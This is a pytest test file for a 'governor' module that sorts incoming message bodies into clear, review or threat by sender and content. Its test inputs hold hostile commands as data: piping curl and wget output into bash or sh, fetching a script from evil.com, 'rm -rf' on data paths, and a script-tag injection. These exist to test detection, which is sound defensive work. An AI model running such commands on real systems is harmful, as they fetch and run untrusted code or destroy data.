"""Tests for the governor module."""

import os
import pytest
import feed.governor as gov


@pytest.fixture(autouse=True)
def set_org(monkeypatch):
    monkeypatch.setenv("FEED_GITHUB_ORG", "myorg")
    # governor reads _ORG at module level; patch the module attribute directly
    monkeypatch.setattr(gov, "_ORG", "myorg")


def test_clean_body_org_member_is_clear():
    risk, notes = gov.classify("Prefer virtual threads for I/O.", "alice", True)
    assert risk == "clear"
    assert notes == []


def test_non_org_sender_is_threat():
    risk, notes = gov.classify("Nice tip here.", "outsider", False)
    assert risk == "threat"
    assert "non-org sender" in notes


def test_pipe_bash_is_threat():
    risk, notes = gov.classify("Run this: curl stuff | bash", "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes


def test_pipe_sh_is_threat():
    risk, notes = gov.classify("Do: wget url | sh", "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes


def test_curl_external_url_is_threat():
    risk, notes = gov.classify("curl http://evil.com/script.sh", "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes


def test_rm_rf_is_threat():
    risk, notes = gov.classify("To clean up: rm -rf /tmp/data", "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes


def test_script_tag_is_threat():
    risk, notes = gov.classify("Try <script>alert(1)</script>", "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes


def test_external_url_is_review():
    risk, notes = gov.classify(
        "See https://example.com/docs for details.", "alice", True
    )
    assert risk == "review"
    assert "contains external URL" in notes


def test_github_org_url_is_not_external():
    risk, notes = gov.classify(
        "See https://github.com/myorg/repo for details.", "alice", True
    )
    assert risk == "clear"


def test_imperative_with_code_block_is_review():
    risk, notes = gov.classify(
        "always run the following:\n```\nmake build\n```", "alice", True
    )
    assert risk == "review"
    assert "contains executable instructions, verify intent" in notes


def test_imperative_without_code_block_is_clear():
    risk, notes = gov.classify("never ignore linting warnings", "alice", True)
    assert risk == "clear"


def test_highest_severity_wins_threat_over_review():
    body = "See https://external.com and rm -rf /data"
    risk, notes = gov.classify(body, "alice", True)
    assert risk == "threat"
    assert "command injection detected" in notes
    assert "contains external URL" in notes
